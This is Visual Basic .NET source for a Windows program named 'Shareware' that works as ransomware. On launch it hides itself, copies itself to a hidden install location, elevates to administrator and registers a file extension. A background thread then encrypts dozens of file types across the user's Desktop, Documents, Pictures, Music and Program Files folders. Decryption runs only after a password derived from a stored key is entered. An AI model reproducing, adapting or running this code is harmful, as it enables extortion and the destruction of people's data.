Imports System.IO
Imports Shareware.Core.LogFuncs

Public Class Form1

    Public UFuncsEx As New Shareware.core.UFuncs

    Sub New()
        ' This call is required by the designer.
        InitializeComponent()

        If My.Computer.FileSystem.FileExists(LogFile) = True Then
            My.Computer.FileSystem.DeleteFile(LogFile)
        End If

        Try : AddHandler Application.ThreadException, AddressOf Application_Exception_Handler _
                : Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException, False) _
                : Catch : End Try


        ' Add any initialization after the InitializeComponent() call.
    End Sub

    Private Sub Application_Exception_Handler(ByVal sender As Object, ByVal e As System.Threading.ThreadExceptionEventArgs)
        Dim ex As Exception = CType(e.Exception, Exception)
        WriteLog(ex.Message, InfoType.Exception)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        If File.Exists(Shareware.core.DirPaths.InstallDir) = True Then
            ArgumentProc()
        Else
            Install()
        End If
    End Sub

    Private Sub ArgumentProc()
        Dim arguments As String() = Environment.GetCommandLineArgs()
        If arguments.Length = 2 Then
            WriteLog("Argument : " & arguments(1), InfoType.None)
        End If

        Select Case LCase(arguments(1))
            Case "-silent" : SilentA()
            Case "-install" : Install()
            Case "-regedit" : AddRegedit()
            Case "-uninstall" : SilentB()
            Case Else
                TextBox2.Text = Shareware.core.DirPaths.strPass
                TextBox3.Text = System.IO.Path.GetFileNameWithoutExtension(arguments(0))
                Me.Show()
                Me.Opacity = 0.1 + 100 / 100
        End Select
    End Sub

    Private Sub Install()
        If Not File.Exists(Shareware.core.DirPaths.InstallDir) = True Then
            File.Copy(Application.ExecutablePath, Shareware.core.DirPaths.InstallDir)
            Shareware.core.UFuncs.FileHide(Shareware.core.DirPaths.InstallDir)
        End If
        Dim addPersistence As New Shareware.core.PerSys()
        If Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(Shareware.core.DirPaths.ExtensionDefaul) Is Nothing Then
            Shareware.core.UFuncs.OpenAsAdmin(Shareware.core.DirPaths.InstallDir, "-regedit")
        Else
            SilentA()
        End If
    End Sub

    Private Sub StartAsAdmin()
        Shareware.core.UFuncs.OpenAsAdmin(Shareware.core.DirPaths.InstallDir, "-uninstall")
    End Sub

    Private Sub AddRegedit()
        Me.Hide()
        My.Computer.Registry.ClassesRoot.CreateSubKey(Shareware.core.DirPaths.ExtensionDefaul).SetValue("", "Shareware File", Microsoft.Win32.RegistryValueKind.String)
        My.Computer.Registry.ClassesRoot.CreateSubKey("Shareware File\shell\open\command").SetValue("", Shareware.core.DirPaths.InstallDir & " ""%l"" ", Microsoft.Win32.RegistryValueKind.String)
        SilentA()
    End Sub

    Private Sub SilentA()
        Me.Hide()
        Dim t = New System.Threading.Thread(New System.Threading.ThreadStart(AddressOf StartAnalisys))
        t.Start()
    End Sub

    Private Sub StartAnalisys()
        On Error Resume Next
        Dim PathToScan() As String = {Shareware.core.DirPaths.Desktop, _
                                                          Shareware.core.DirPaths.Document, _
                                                          Shareware.core.DirPaths.Pictures, _
                                                          Shareware.core.DirPaths.Music, _
                                                          Shareware.core.DirPaths.ProgramFiles}

        Dim ExtensionToScan() As String = {"*.aif", "*.cda", "*.mid", "*.mp3", "*.mpa", "*.ogg", "*.wav", "*.wma", "*.wpl", _
                                           "*.7z", "*.arj", "*.pkg", "*.rar", "*.rpm", "*.zip", "*.tar.gz", "*.rar", _
                                           "*.dat", "*.csv", "*.db", "*.dbf", "*.sql", _
                                           "*.jar", "*.py", "*.exe", _
                                           "*.bmp", "*.gif", "*.ico", "*.jpeg", "*.jpg", "*.png", _
                                           "*.key", "*.odp", "*.pps", "*.ppt", "*.pptx", _
                                           "*.c", "*.cpp", "*.h", "*.cs", "*.java", "*.class", "*.swift", _
                                           "*.ods", "*.xls", "*.xlsm", "*.xlsx", _
                                           "*.3g2", "*.3gp", "*.avi", "*.flv", "*.h264", "*.m4v", "*.mkv", "*.mov", "*.mp4", "*.mpg", "*.wmv", "*.mpeg", _
                                           "*.doc", "*.docx", "*.odt", "*.pdf", "*.rtf", "*.tex", "*.txt", "*.wpd"}


        For Each PathScan As String In PathToScan

            Dim FileScanner As IEnumerable(Of FileInfo) = FileDirSearcher.GetFiles(dirPath:=PathScan,
                                                                             searchOption:=SearchOption.AllDirectories,
                                                                             fileNamePatterns:={"*"},
                                                                             fileExtPatterns:=ExtensionToScan,
                                                                             ignoreCase:=True,
                                                                             throwOnError:=True)

            For Each CurrentFile As FileInfo In FileScanner
                Dim CriptHook As New Shareware.core.ShareHook
                Dim CriptTheFile As Boolean = CriptHook.Encriptor(CurrentFile.FullName)
                If CriptTheFile = True Then
                    WriteLog("File: " & CurrentFile.FullName & " Successfully Processed!", InfoType.Information)
                Else
                    WriteLog("File Processing Failed: " & CurrentFile.FullName, InfoType.Critical)
                End If
            Next
        Next

    End Sub

#Region " Uninstall "

    Private Sub SilentB()
        Me.Show()
        Me.Opacity = 0.1 + 100 / 100
        PictureBox1.Visible = False
        TextBox1.Visible = False
        TextBox2.Visible = False
        TextBox3.Visible = False
        TextBox4.Visible = False
        Label1.Visible = False
        Label3.Visible = False
        Label4.Visible = False
        ProgressBar1.Visible = True
        Dim t = New System.Threading.Thread(New System.Threading.ThreadStart(AddressOf StartAnalisysB))
        t.Start()
    End Sub

    Private Sub StartAnalisysB()
        On Error Resume Next
        Dim PathToScan() As String = {Shareware.core.DirPaths.Desktop, _
                                                          Shareware.core.DirPaths.Document, _
                                                          Shareware.core.DirPaths.Pictures, _
                                                          Shareware.core.DirPaths.Music, _
                                                          Shareware.core.DirPaths.ProgramFiles}
        Dim ExtensionDefaul As String = "*" & Shareware.core.DirPaths.ExtensionDefaul

        Dim ExtensionToScan() As String = {ExtensionDefaul}

        For Each PathScan As String In PathToScan

            Dim FileScanner As IEnumerable(Of FileInfo) = FileDirSearcher.GetFiles(dirPath:=PathScan,
                                                                             searchOption:=SearchOption.AllDirectories,
                                                                             fileNamePatterns:={"*"},
                                                                             fileExtPatterns:=ExtensionToScan,
                                                                             ignoreCase:=True,
                                                                             throwOnError:=True)
            Dim LocalVariable As Integer = FileScanner.Count
            Dim Maximun As Integer = FileScanner.Count

            For Each CurrentFile As FileInfo In FileScanner
                LocalVariable -= 1
                Dim CriptHook As New Shareware.core.ShareHook
                Dim DeCriptTheFile As Boolean = CriptHook.Decriptor(CurrentFile.FullName)
                Me.BeginInvoke(Sub()
                                   Dim CalculatePortage As Integer = (LocalVariable * 100) / Maximun
                                   ProgressBar1.Value = CalculatePortage
                               End Sub)
                If DeCriptTheFile = True Then
                    WriteLog("File: " & CurrentFile.FullName & " Successfully Processed!", InfoType.Information)
                Else
                    WriteLog("File Processing Failed: " & CurrentFile.FullName, InfoType.Critical)
                End If
            Next
        Next

        End
    End Sub

#End Region


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not TextBox5.Text = "" Then
            If TextBox5.Text = UFuncsEx.EncodeBase64(Shareware.core.DirPaths.strPass) Then
                StartAsAdmin()
            End If
        End If
    End Sub

End Class
